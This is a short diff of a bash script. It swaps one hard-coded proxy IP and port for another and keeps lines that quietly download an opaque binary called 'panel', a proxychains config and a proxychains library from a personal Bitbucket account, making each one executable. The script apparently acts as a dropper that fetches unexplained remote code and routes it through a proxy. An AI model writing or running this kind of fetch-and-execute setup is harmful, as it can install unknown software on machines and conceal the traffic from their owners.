@@ -1,6 +1,6 @@
 #bash
-proxy="185.199.229.156" 
-port="7492" 
+proxy="31.171.241.178" 
+port="443" 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
